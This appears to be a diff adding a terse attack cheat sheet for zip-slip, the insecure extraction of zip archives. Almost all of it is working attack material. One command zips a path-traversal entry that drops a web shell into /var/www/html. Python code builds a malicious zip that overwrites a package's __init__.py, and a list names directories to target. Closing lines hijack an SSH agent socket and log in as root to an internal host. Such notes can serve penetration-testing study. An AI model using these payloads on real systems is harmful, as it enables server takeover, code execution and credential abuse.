@@ -1,0 +1,41 @@
+Insecure Zip File Extraction
+
+place your shell on /var/www/html/5H311.php
+zip skywalker.zip ../../../../../../../../var/www/html/5H311.php
+
+Using Python to create py exploit
+
+>>> import os
+>>> extraction_path = "/home/ajin/webapp/uploads/"
+>>> filename = "../../foo.py"
+>>> outfile = os.path.join(extraction_path, filename)
+>>> outfile
+'/home/ajin/webapp/uploads/../../foo.py'
+>>> open(outfile, "w").write("print 'test'")
+>>> open("/home/ajin/foo.py", "r").read()
+"print 'test'"
+
+-------------------------------------------------------------
+
+Using Python to create zip exploit 
+
+import zipfile
+z_info = zipfile.ZipInfo(r"../config/__init__.py")
+z_file = zipfile.ZipFile("/home/ajin/Desktop/bad.zip", mode="w")
+z_file.writestr(z_info, "print 'test'")
+z_info.external_attr = 0777 << 16L
+z_file.close()
+
+------------------------------------------------------------
+
+Python dir 
+
+conf, config, settings, utils, urls, view, tests, scripts, controllers, modules, models, admin, login
+
+
+
+export SSH_AUTH_SOCK=/tmp/
+ssh-add -l
+ssh root@172.18.0.1 -p 2222
+
+
